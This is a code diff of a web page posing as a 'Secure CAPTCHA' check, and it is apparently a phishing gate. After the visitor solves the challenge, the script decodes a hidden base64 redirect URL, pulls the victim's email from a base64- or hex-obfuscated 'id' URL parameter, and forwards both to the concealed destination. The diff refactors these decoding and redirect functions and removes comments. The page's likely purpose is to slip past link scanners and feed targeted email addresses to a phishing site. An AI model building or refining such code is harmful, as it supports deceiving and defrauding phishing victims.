@@ -143,13 +143,11 @@
 </head>
 <body>
 
-  <!-- Top-left Logo -->
   <div class="logo">
     <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Captcha Padlock Logo">
     <span>Secure CAPTCHA</span>
   </div>
 
-  <!-- CAPTCHA Challenge Box -->
   <div id="captcha-box">
     <div class="captcha-header">For security reasons, please solve this to continue.</div>
     <div id="captcha-question">Loading...</div>
@@ -195,35 +193,40 @@
       document.getElementById("message").innerText = '';
     }
 
-    function decodeHex(hex) {
-      try {
-        return hex.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
-      } catch {
-        return null;
-      }
+    function decodeMetaRefresh(base64Str) {
+      const decoded = atob(base64Str);
+      const match = decodeURIComponent(decoded).match(/url=([^"'&]+)/i);
+      return match ? match[1] : null;
     }
 
-    function decodeEmail(input) {
-      try {
-        // Try URL decoding
-        let decoded = decodeURIComponent(input);
-
-        // If it's valid base64, decode it
-        try {
-          const b64 = atob(decoded);
-          if (/^[\x20-\x7E]+$/.test(b64)) decoded = b64;
-        } catch {}
-
-        // If it looks like hex (only hex chars and even length), decode it
-        if (/^[0-9a-f]+$/i.test(decoded) && decoded.length % 2 === 0) {
-          const hexDecoded = decodeHex(decoded);
-          if (hexDecoded.includes("@")) return hexDecoded;
-        }
-
-        return decoded.replace(/%40/g, "@");
-      } catch {
-        return input;
+    function decodeHex(str) {
+      let result = '';
+      for (let i = 0; i < str.length; i += 2) {
+        result += String.fromCharCode(parseInt(str.substr(i, 2), 16));
       }
+      return result;
+    }
+
+    function decodeEmail(raw) {
+      try {
+        const base64 = atob(raw);
+        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(base64)) return base64;
+      } catch {}
+
+      try {
+        const hexDecoded = decodeHex(raw);
+        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(hexDecoded)) return hexDecoded;
+      } catch {}
+
+      // return as-is if nothing decoded
+      return raw;
+    }
+
+    function parseEmailParam() {
+      const params = new URLSearchParams(window.location.search);
+      let emailRaw = params.get("id");
+      if (!emailRaw) return null;
+      return decodeEmail(emailRaw);
     }
 
     function validateCaptcha() {
@@ -248,21 +251,14 @@
 
     function redirectUser() {
       try {
-        const decoded = atob(base64Ref);
-        const metaDecoded = decodeURIComponent(decoded);
-        const urlMatch = metaDecoded.match(/url=([^"'&]+)/i);
-        let finalUrl = urlMatch ? urlMatch[1] : null;
+        const finalUrl = decodeMetaRefresh(base64Ref);
+        if (!finalUrl) throw new Error("Invalid redirect format");
 
-        if (!finalUrl) throw new Error("Invalid redirect format.");
+        const email = parseEmailParam();
+        const encodedEmail = encodeURIComponent(email).replace(/%40/g, "@");
 
-        const rawEmail = new URLSearchParams(window.location.search).get("id");
-        const cleanEmail = rawEmail ? decodeEmail(rawEmail) : null;
-
-        if (cleanEmail) {
-          finalUrl += `?e=${encodeURIComponent(cleanEmail).replace(/%40/g, "@")}`;
-        }
-
-        window.location.href = finalUrl;
+        const urlWithParam = email ? `${finalUrl}?e=${encodedEmail}` : finalUrl;
+        window.location.href = urlWithParam;
       } catch (e) {
         alert("Redirect failed. Invalid format.");
       }
